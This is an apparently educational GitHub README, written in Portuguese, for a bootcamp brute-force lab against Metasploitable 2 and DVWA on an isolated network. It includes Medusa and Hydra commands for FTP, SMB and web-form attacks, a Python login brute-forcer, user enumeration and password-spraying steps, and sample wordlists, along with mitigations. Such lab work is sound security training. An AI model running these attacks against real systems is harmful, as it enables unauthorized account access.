# 🔐 Laboratório de Força Bruta com Kali Linux e Medusa

> Desafio DIO - Ethical Hacking: Implementação de ataques de força bruta controlados para fins educacionais

## 📋 Sobre o Projeto

Este repositório documenta a implementação de cenários de ataque de força bruta utilizando **Kali Linux** e a ferramenta **Medusa**, em ambiente controlado com máquinas vulneráveis. O objetivo é compreender técnicas de ataque para desenvolver melhores estratégias de defesa.

⚠️ **Aviso Legal**: Todo o conteúdo deste projeto é estritamente educacional e foi executado em ambiente isolado e controlado. Não utilize estas técnicas em sistemas sem autorização expressa.

---

## 🖥️ Configuração do Ambiente

### Máquinas Virtuais

| VM | Sistema | IP | Função |
|---|---|---|---|
| Atacante | Kali Linux | 192.168.56.101 | Execução dos ataques |
| Alvo | Metasploitable 2 | 192.168.56.102 | Serviços vulneráveis |

### Configuração de Rede

Ambas as VMs configuradas em modo **Host-Only Adapter** (rede interna isolada):

```bash
# No VirtualBox
# Kali Linux: Configurações > Rede > Adaptador 1 > Host-only Adapter
# Metasploitable 2: Configurações > Rede > Adaptador 1 > Host-only Adapter
```

### Verificação de Conectividade

```bash
# Do Kali Linux, verificar se consegue pingar o alvo
ping 192.168.56.102

# Scan de portas abertas no alvo
nmap -sV 192.168.56.102
```

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Versão | Propósito |
|---|---|---|
| Kali Linux | 2024.x | Sistema operacional do atacante |
| Medusa | 2.2 | Automação de ataques de força bruta |
| Nmap | 7.x | Enumeração de serviços |
| Hydra | 9.x | Alternativa para comparação |
| smbclient | 4.x | Validação de acessos SMB |
| Python | 3.x | Automação de ataques web |

---

## 📚 Cenários de Ataque Implementados

### 1️⃣ Ataque de Força Bruta em FTP

**Objetivo**: Quebrar credenciais do serviço FTP (porta 21)

```bash
# Comando Medusa para FTP
medusa -h 192.168.56.102 -u msfadmin -P wordlists/passwords.txt -M ftp

# Comando com lista de usuários
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4
```

**Parâmetros explicados**:
- `-h`: Host alvo
- `-u`/`-U`: Usuário único ou arquivo de usuários
- `-P`: Arquivo de senhas
- `-M`: Módulo/protocolo (ftp)
- `-t`: Threads paralelas (4)

**Resultado esperado**: Acesso com credenciais `msfadmin:msfadmin`

---

### 2️⃣ Ataque em Formulário Web (DVWA)

**Configuração DVWA**:
- Nível de segurança: Low
- URL: `http://192.168.56.102/dvwa/login.php`

```bash
# Usando Hydra para formulário web
hydra -L wordlists/users.txt -P wordlists/passwords.txt \
  192.168.56.102 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Script Python para automação** (alternativa ao Medusa/Hydra):

```python
#!/usr/bin/env python3
import requests

url = "http://192.168.56.102/dvwa/login.php"

with open("wordlists/users.txt") as f:
    users = [line.strip() for line in f]

with open("wordlists/passwords.txt") as f:
    passwords = [line.strip() for line in f]

for user in users:
    for password in passwords:
        data = {
            "username": user,
            "password": password,
            "Login": "Login"
        }
        response = requests.post(url, data=data, allow_redirects=False)
        
        if response.status_code == 302:
            print(f"[+] SUCESSO: {user}:{password}")
            break
        else:
            print(f"[-] Falha: {user}:{password}")
```

---

### 3️⃣ Password Spraying em SMB com Enumeração

**Passo 1: Enumeração de usuários**

```bash
# Usando rpcclient para listar usuários
rpcclient -U "" -N 192.168.56.102 -c "enumdomusers"

# Alternativa com enum4linux
enum4linux -U 192.168.56.102
```

**Passo 2: Password Spraying com Medusa**

```bash
# Testando uma senha comum em múltiplos usuários
medusa -h 192.168.56.102 -U wordlists/users.txt -p password123 -M smbnt

# Com wordlist de senhas (força bruta completa)
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt -t 2
```

**Passo 3: Validação do acesso**

```bash
# Conexão SMB com credenciais descobertas
smbclient //192.168.56.102/tmp -U msfadmin
# Digitar senha quando solicitado

# Listar compartilhamentos
smbclient -L 192.168.56.102 -U msfadmin
```

---

## 📁 Wordlists Utilizadas

### wordlists/users.txt
```
admin
root
msfadmin
user
test
guest
```

### wordlists/passwords.txt
```
password
123456
admin
msfadmin
root
password123
12345678
qwerty
letmein
welcome
```

---

## 🛡️ Medidas de Mitigação

| Vulnerabilidade | Risco | Mitigação |
|---|---|---|
| Senhas fracas | Acesso não autorizado | Política de senhas fortes, mínimo 12 caracteres |
| Autenticação sem MFA | Comprometimento de conta | Implementar Autenticação Multi-Fator |
| Enumeração de usuários | Reconhecimento do alvo | Desabilitar listagem de usuários, mensagens genéricas de erro |
| Sem limitação de tentativas | Força bruta eficiente | Implementar rate limiting, bloqueio temporário |
| Protocolos legados (SMBv1) | Vulnerabilidades conhecidas | Desabilitar SMBv1, usar SMBv3 com criptografia |
| Serviços desnecessários | Superfície de ataque ampla | Princípio do menor privilégio, hardening do sistema |

### Recomendações de Segurança

1. **Política de Senhas**:
   - Mínimo 12 caracteres
   - Complexidade (maiúsculas, minúsculas, números, símbolos)
   - Troca periódica obrigatória
   - Verificação contra banco de senhas vazadas

2. **Monitoramento**:
   - Logs de autenticação
   - Detecção de múltiplas falhas seguidas
   - Alertas em tempo real

3. **Arquitetura**:
   - Segmentação de rede
   - VPN para acesso administrativo
   - Jump servers para administração

---

## 📊 Resultados dos Testes

| Serviço | Credencial Encontrada | Tempo Estimado | Status |
|---|---|---|---|
| FTP | msfadmin:msfadmin | < 1 min | ✅ Vulnerável |
| SSH | msfadmin:msfadmin | < 1 min | ✅ Vulnerável |
| SMB | msfadmin:msfadmin | < 1 min | ✅ Vulnerável |
| DVWA | admin:password | 30 seg | ✅ Vulnerável |

---

## 🎓 Conclusões e Aprendizados

### Por que ferramentas clássicas ainda importam (era da IA e MFA)

1. **Legado tecnológico**: Muitas organizações ainda mantêm sistemas antigos sem MFA
2. **Configuração incorreta**: MFA mal implementado pode ter bypasses
3. **Entendimento fundamental**: Compreender ataques básicos é essencial para defender sistemas complexos
4. **Falsos positivos**: Ferramentas clássicas ajudam a calibrar sistemas de detecção

### Limitações em Interfaces Web Modernas

- Proteções CSRF dificultam automação simples
- Rate limiting implementado na maioria das aplicações modernas
- CAPTCHAs e desafios interativos
- Web Application Firewalls (WAFs)

### Boas Práticas para Mitigar Falsos Positivos

- Ajustar thresholds de detecção baseado em baseline
- Correlação de eventos (IP, horário, padrão de comportamento)
- Whitelist de IPs administrativos
- Análise de comportamento do usuário (UEBA)

---

## 📚 Referências

- [Kali Linux Official](https://www.kali.org/)
- [Medusa Project](https://github.com/jmk-foofus/medusa)
- [DVWA Official](https://github.com/digininja/DVWA)
- [Nmap Documentation](https://nmap.org/book/)
- [OWASP Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack)

---

## 👤 Autor

**Adam Gabriel Garcia de Souza**

- LinkedIn: [https://www.linkedin.com/in/adam-gabriel-b9479b2a6/]
- GitHub: [https://github.com/AdamGabriel1]
- DIO: [https://web.dio.me/users/adamgabriel289]

---

> ⚠️ **Disclaimer**: Este projeto foi desenvolvido exclusivamente para fins educacionais no contexto do bootcamp de Ethical Hacking da DIO. Não execute estas técnicas em sistemas sem autorização prévia por escrito.
